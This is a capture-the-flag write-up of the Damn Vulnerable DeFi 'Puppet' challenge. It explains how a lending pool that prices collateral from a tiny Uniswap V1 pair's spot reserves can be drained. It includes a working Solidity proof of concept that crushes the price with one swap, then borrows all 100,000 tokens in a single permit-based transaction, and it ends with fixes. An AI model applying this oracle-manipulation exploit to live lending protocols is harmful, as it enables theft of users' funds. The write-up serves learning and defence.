# Puppet — Pricing Collateral From a Pool You Can Move

**Challenge:** Damn Vulnerable DeFi v4 — Puppet
**Category:** Oracle Manipulation / Spot Price From a Shallow AMM
**Severity:** Critical (the whole lending pool is drained for a fraction of its value)

## What's going on

A lending pool holds 100,000 DVT. To borrow, a user deposits ETH worth twice the loan,
and the pool values the token using a Uniswap V1 pair. That pair holds only 10 ETH and
10 DVT. The player starts with 1000 DVT and 25 ETH, and the goal is to move all 100,000
DVT to a recovery account **in a single transaction**.

## The bug

The pool's price comes straight from the pair's raw reserves:

```solidity
function _computeOraclePrice() private view returns (uint256) {
    return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
}
```

That is a spot price taken from one pool, and the pool is tiny compared with what the
lender protects. The player's 1000 DVT is 100 times the pair's token reserve. Selling
them into the pair pulls almost all of its ETH out and leaves it holding a pile of DVT,
so the ETH-per-DVT price the lender reads collapses by orders of magnitude.

Collateral is computed from that price, so the same loan that should need about 200,000
ETH-equivalent of value needs only a small deposit once the price is crushed. With the
constant-product formula, the swap yields roughly 9.9 ETH and the required deposit for
the full 100,000 DVT drops to roughly 20 ETH, which the player can afford with the
swap proceeds plus the starting 25 ETH.

## The attack

1. Dump the player's 1000 DVT into the Uniswap V1 pair with `tokenToEthSwapInput`. The
   pair's DVT-per-ETH ratio, and so the lender's price, collapses.
2. Ask the pool for `calculateDepositRequired(poolBalance)`. It is now cheap.
3. Call `borrow(poolBalance, recovery)` with that deposit. All 100,000 DVT go straight
   to the recovery account.

## The single-transaction constraint

The success check requires the player's nonce to be exactly 1. The steps above need the
player to move tokens to a contract, swap, and borrow, which would be several
transactions. The workaround is an **EIP-2612 permit**:

- The player signs an off-chain permit (`vm.sign`, no transaction) letting an attacker
  contract pull the 1000 DVT. The spender address is known in advance with
  `vm.computeCreateAddress(player, nonce)`.
- The player's one transaction deploys the attacker contract with the player's 25 ETH.
- The attacker's constructor uses the permit, swaps, borrows and sends the tokens to
  recovery, all inside that deployment.

## PoC

```solidity
function test_puppet() public checkSolvedByPlayer {
    address attackerAddr = vm.computeCreateAddress(player, vm.getNonce(player));
    uint256 deadline = block.timestamp + 1 days;

    bytes32 structHash = keccak256(
        abi.encode(
            keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)"),
            player, attackerAddr, PLAYER_INITIAL_TOKEN_BALANCE, token.nonces(player), deadline
        )
    );
    bytes32 digest = keccak256(abi.encodePacked("\x19\x01", token.DOMAIN_SEPARATOR(), structHash));
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPrivateKey, digest);

    new PuppetAttacker{value: PLAYER_INITIAL_ETH_BALANCE}(
        token, lendingPool, uniswapV1Exchange, player, recovery,
        PLAYER_INITIAL_TOKEN_BALANCE, deadline, v, r, s
    );
}

contract PuppetAttacker {
    constructor(/* ... */) payable {
        token.permit(player, address(this), amount, deadline, v, r, s);
        token.transferFrom(player, address(this), amount);

        token.approve(address(exchange), amount);
        exchange.tokenToEthSwapInput(amount, 1, deadline);

        uint256 poolBalance = token.balanceOf(address(pool));
        pool.borrow{value: pool.calculateDepositRequired(poolBalance)}(poolBalance, recovery);
    }

    receive() external payable {}
}
```

Full test file: `test/puppet/Puppet.t.sol`

## Why I'm calling this Critical

- **Total loss of the lender's tokens.** All 100,000 DVT leave for a small deposit.
- **The deposit is not at risk.** The attacker's ETH is recovered by the swap and the
  deposit is a fraction of the value taken. The pool is left with a worthless claim.
- **No special access or timing.** One transaction by anyone with enough tokens to
  move the pair.
- **The price is attacker-controlled by design.** The oracle reads state the attacker
  can change in the same transaction.

## Fix

- Never price collateral from the spot reserves of a pool that can be moved in the
  same transaction. Use a manipulation-resistant source: a TWAP over a meaningful
  window, an external price feed, or several sources with deviation checks.
- Do not price from shallow liquidity. A pair this small should never back a lender
  holding 100,000 tokens, and the pool should check the pair's depth.
- Add sanity bounds on how far the price may move relative to its recent history.

## Takeaway

Search for `balanceOf(pair)` and `getReserves` used as a price, and ask whether a user
can change those reserves in the same transaction as the call that reads them. Compare
the pair's liquidity with the value the pool protects. Later challenges (Puppet V2 and
V3) show that moving to a better oracle source is not enough when the liquidity behind
it is still thin.
